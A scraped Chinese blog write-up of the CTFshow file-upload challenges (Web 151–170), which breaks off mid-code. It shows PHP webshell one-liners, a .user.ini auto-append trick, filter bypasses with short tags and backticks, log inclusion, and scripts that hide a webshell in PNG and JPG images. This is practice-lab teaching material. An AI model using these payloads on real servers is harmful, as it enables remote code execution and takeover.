{"blogid": "123411088", "writerAge": "码龄2年", "writerBlogNum": "40", "writerCollect": "110", "writerComment": "22", "writerFan": "34", "writerGrade": "3级", "writerIntegral": "483", "writerName": "小元砸", "writerProfileAdress": "writer_image\\profile_123411088.jpg", "writerRankTotal": "101611", "writerRankWeekly": "363614", "writerThumb": "41", "writerVisitNum": "41298", "blog_read_count": "5245", "blog_time": "已于 2022-03-27 21:43:05 修改", "blog_title": "CTFshow web入门——文件上传", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atelier-sulphurpool-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>目录</h3>\n<ul><li><a href=\"#Web_151_1\">Web 151</a></li><li><ul><li><a href=\"#_3\">考点：后端无验证，前端校验</a></li></ul>\n</li><li><a href=\"#Web_152_15\">Web 152</a></li><li><ul><li><a href=\"#_18\">考点：绕过前端校验</a></li></ul>\n</li><li><a href=\"#Web_153_27\">Web 153</a></li><li><ul><li><a href=\"#_30\">考点：文件后缀名，黑名单</a></li></ul>\n</li><li><a href=\"#Web_154155_44\">Web 154-155</a></li><li><ul><li><a href=\"#php_49\">考点：文件内容过滤，过滤关键字是php</a></li></ul>\n</li><li><a href=\"#Web_156158_65\">Web 156-158</a></li><li><a href=\"#Web159_83\">Web159</a></li><li><a href=\"#Web_160_90\">Web 160</a></li><li><ul><li><a href=\"#php_92\">考点：过滤了php，执行函数，反引号等</a></li></ul>\n</li><li><a href=\"#Web_161_107\">Web 161</a></li><li><a href=\"#Web_162163_111\">Web 162-163</a></li><li><a href=\"#Web_164_120\">Web 164</a></li><li><ul><li><a href=\"#_png_122\">考点： png二次渲染</a></li></ul>\n</li><li><a href=\"#Web_165_200\">Web 165</a></li><li><ul><li><a href=\"#jpg_202\">考点：jpg二次渲染</a></li></ul>\n</li><li><a href=\"#Web_166_379\">Web 166</a></li><li><a href=\"#Web_167_387\">Web 167</a></li><li><ul><li><a href=\"#Apache_389\">考点：Apache的包含解析</a></li></ul>\n</li><li><a href=\"#Web_168_404\">Web 168</a></li><li><ul><li><a href=\"#_406\">考点：免杀，过滤了好多执行函数</a></li></ul>\n</li><li><a href=\"#Web_169_414\">Web 169</a></li><li><ul><li><a href=\"#php__416\">考点：免杀，主要是过滤了php, &lt;&gt;等</a></li></ul>\n</li><li><a href=\"#Web_170_427\">Web 170</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"Web_151_1\"></a>Web 151</h1>\n<h2><a id=\"_3\"></a>考点：后端无验证，前端校验</h2>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9897778d8c0743fa906867bea78168d8.png\"/>查看源码可以发现只能上传<code>png</code>图片<br/> 修改为<code>php</code><br/> <img alt=\"在这里插入图片描述\" src=\"image\\2cf1fc5632d043cf830595d14b529736.png\"/>写一个php文件上传一句话木马<br/> <img alt=\"在这里插入图片描述\" src=\"image\\19cb2d24d3924f5c92dea6e88bfac8de.png\"/><br/> 可以发现已经成功上传<br/> <img alt=\"在这里插入图片描述\" src=\"image\\358db643e2964614a158a81f25a1a033.png\"/><img alt=\"在这里插入图片描述\" src=\"image\\983e14879cf8470eb9122816febe59a7.png\"/>查看上级目录发现可疑文件<br/> <img alt=\"在这里插入图片描述\" src=\"image\\7a24fe618ff84b1b8d74928d0dabb381.png\"/><br/> 查看flag.php文件内容得出flag<br/> <img alt=\"在这里插入图片描述\" src=\"image\\b04f80eb75ad402a9fc29e7a77c01478.png\"/></p>\n<h1><a id=\"Web_152_15\"></a>Web 152</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\c038fdb4e36f426986e1be138d1d66ff.png\"/></p>\n<h2><a id=\"_18\"></a>考点：绕过前端校验</h2>\n<p><strong>解题思路：</strong><br/> 经过一系列的方法测试上题的解题方法并不适用于本题。直接改前端，后端会校验，文件不合格。那就抓包一下。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\24521f78a39c423fab4870bcdc9dbc43.png\"/><br/> 将<code>Content-Type</code>内容修改成<code>image/png</code>，重发，发现成功上传<br/> <img alt=\"在这里插入图片描述\" src=\"image\\1cb63ca492f54c138b4d587f9de7ac05.png\"/>剩下的步骤与151相同查看上级目录，发现flag.php，查看flag.php内容得到flag<br/> <img alt=\"在这里插入图片描述\" src=\"image\\83e2eca1e486487eb515f4de7e77b11b.png\"/></p>\n<h1><a id=\"Web_153_27\"></a>Web 153</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\26b1295202c74774aa897e1aedbeab70.png\"/></p>\n<h2><a id=\"_30\"></a>考点：文件后缀名，黑名单</h2>\n<p>利用上传user.ini进行文件上传绕过<br/> <strong>解题过程：</strong><br/> 上传一个含木马的图片<br/> <img alt=\"在这里插入图片描述\" src=\"image\\44e329c258bb4cb4a4559c72e63e3f1d.png\"/>接着上传<code>.user.ini</code>内容为 <code>auto_append_file=“xxx”</code><br/> xxx为我们上传的<code>文件名</code>。<br/> 这样就在每个<code>php文件</code>上包含了我们的木马文件。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\afd0ecf446be41f19ed8ae269366cfc7.png\"/><br/> 查看/upload目录下是否上传成功，木马上传成功<br/> <img alt=\"在这里插入图片描述\" src=\"image\\845ccb0bbb944caa8aefb342418ff65f.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\864ca5c9303544e498288308a1d9285c.png\"/></p>\n<h1><a id=\"Web_154155_44\"></a>Web 154-155</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\7b206eff3a1e494cb8aa4dababddbfb8.png\"/></p>\n<h2><a id=\"php_49\"></a>考点：文件内容过滤，过滤关键字是php</h2>\n<p>上传一个图片木马，发现上传不了，经过一系列的尝试发现是对文件内容作了些过滤，过滤了php，所以采用简短的语句进行绕过<br/> <img alt=\"在这里插入图片描述\" src=\"image\\3a8f5b91cd704c7e948d579dbee7b542.png\"/></p>\n<p>这一步和上题相似</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\8579764a8ef847708cabd70e2faa45d5.png\"/></p>\n<p>发现已经上传成功<br/> <img alt=\"在这里插入图片描述\" src=\"image\\32fdfde2666b45d6a6c22ca8367f8b09.png\"/></p>\n<p>得到flag</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\802cd1305eb04dd286a88ab03a816943.png\"/></p>\n<h1><a id=\"Web_156158_65\"></a>Web 156-158</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\24be9c8589894a869fe6b901af56c6ef.png\"/>在前面的基础上过滤了<code>[]</code>那我们直接用<code>{}</code>来代替</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>或者<br/> 那就直接输出flag算了，不搞一句话了。摊牌了，反正知道flag位置</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tac ../f*'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\f3a85ba0a31a41b58774ccd379791e78.png\"/><img alt=\"在这里插入图片描述\" src=\"image\\8aeec41b29c64ba2a0e27465727956db.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b8ccea853a9949b59a1f10595e1f30b1.png\"/></p>\n<h1><a id=\"Web159_83\"></a>Web159</h1>\n<p>过滤了括号，那就用反引号就可以啦</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token string backtick-quoted-string\">`tac ../f*`</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h1><a id=\"Web_160_90\"></a>Web 160</h1>\n<h2><a id=\"php_92\"></a>考点：过滤了php，执行函数，反引号等</h2>\n<p><strong>解题思路：</strong><br/> <code>日志包含</code><br/> 过滤关键字是<code>log</code><br/> 所以用拼接绕过<br/> 上传完<code>.user.ini</code>和图片后<br/> 访问网站然后修改<code>ua</code>头信息<br/> <img alt=\"在这里插入图片描述\" src=\"image\\47202775efdc4dab89a9ce2d324d76a9.png\"/><img alt=\"在这里插入图片描述\" src=\"image\\ca04ae17915e41e8b2146e2e2b27a690.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\bf1da34547764ffda4b205530a196cf6.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\609de3ba7fe44a0a97788677a44afebf.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\d3cf93278fc54886bdef1c129f186c92.png\"/></p>\n<h1><a id=\"Web_161_107\"></a>Web 161</h1>\n<p>在160的基础上增加图片头即可，即 <code>GIF89A</code></p>\n<h1><a id=\"Web_162163_111\"></a>Web 162-163</h1>\n<p>目前了解有三种解法<br/> 一种是<code>session包含</code>，一个是<code>远程文件包含</code>，还有一种是<code>data伪协议</code>，不过要把伪协议代码用<code>取反</code>表示<br/> <a href=\"https://blog.csdn.net/Kracxi/article/details/122954230\">伪协议</a><br/> <a href=\"https://blog.csdn.net/weixin_45551083/article/details/110289593?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161901286316780261926834%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161901286316780261926834&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-5-110289593.first_rank_v2_pc_rank_v29&amp;utm_term=CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\">条件竞争-脚本</a><br/> <a href=\"https://www.cnblogs.com/sen-y/p/15579078.html\">条件竞争-burpsuit</a></p>\n<p>但是这几种方法我都没有出结果，悲伤…</p>\n<h1><a id=\"Web_164_120\"></a>Web 164</h1>\n<h2><a id=\"_png_122\"></a>考点： png二次渲染</h2>\n<p>利用下方代码进行png二次渲染绕过</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1b</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xbe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xae</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xae</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xcc</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4c</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbf</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6b</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2d</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xad</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\n<span class=\"token variable\">$img</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$y</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$y</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$y</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$r</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$g</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">imagesetpixel</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">imagepng</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'1.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#保存在本地的图片马</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>木马内容</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><code>imagepng($img,'1.png');</code><br/> 要修改的图片的路径,1.png是使用的文件，可以不存在<br/> 会在目录下自动创建一个<code>1.png</code>图片<br/> 图片脚本内容：</p>\n<pre><code class=\"prism language-php\"><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><strong>使用方法：</strong><br/> 例子：查看图片，get传入<code>0=system</code>；post传入<code>tac flag.php</code></p>\n<p><strong>注：</strong><br/> 运行上面的代码需要有php的<code>gd库</code></p>\n<p>下面的代码可以检测是否有gd库的存在</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">extension_loaded</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'可以使用gd\n'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token function\">gd_info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$cate</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$cate</span></span>: <span class=\"token interpolation\"><span class=\"token variable\">$value</span></span>\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'没有安装gd扩展'</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>如没有<br/> 把你PHP目录下的<code>ext</code>文件夹里的<code>php_gd.dll</code>复制到系统目录下(C:\\Windows\\System32),然后修改你的<code>php.ini</code>文件,找到以下位置</p>\n<pre><code class=\"prism language-php\"><span class=\"token punctuation\">;</span>extension<span class=\"token operator\">=</span>php_gd<span class=\"token operator\">.</span>dll\n</code></pre>\n<p>把前面的<code>;</code>去掉<br/> 如php.ini中没有<code>extension=php_gd.dll</code>，自行添加即可</p>\n<p>将生成的图片上传，bp抓包<br/> <img alt=\"在这里插入图片描述\" src=\"image\\65605804fc6f437bb77de12ae2fc95ca.png\"/></p>\n<h1><a id=\"Web_165_200\"></a>Web 165</h1>\n<h2><a id=\"jpg_202\"></a>考点：jpg二次渲染</h2>\n<p>运用以下脚本进行<code>jpg二次渲染</code>绕过</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$miniPayload</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?=eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">extension_loaded</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gd'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'imagecreatefromjpeg'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php-gd is not installed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"custom_error_handler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pad</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$pad</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$pad</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$nullbytePayloadSize</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$pad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dis</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataInputStream</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$outStream</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$extraBytes</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$correctImage</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">readShort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0xFFD8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Incorrect SOI marker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">eof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">readByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$marker</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">readByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">readShort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">skip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$size</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$marker</span> <span class=\"token operator\">===</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$startPos</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">seek</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$outStreamTmp</span> <span class=\"token operator\">=</span>\n                <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$outStream</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$startPos</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span>\n                <span class=\"token variable\">$miniPayload</span> <span class=\"token operator\">.</span>\n                <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\0\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nullbytePayloadSize</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span>\n                <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$outStream</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$startPos</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">checkImage</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$outStreamTmp</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extraBytes</span> <span class=\"token operator\">!==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">eof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">readByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> <span 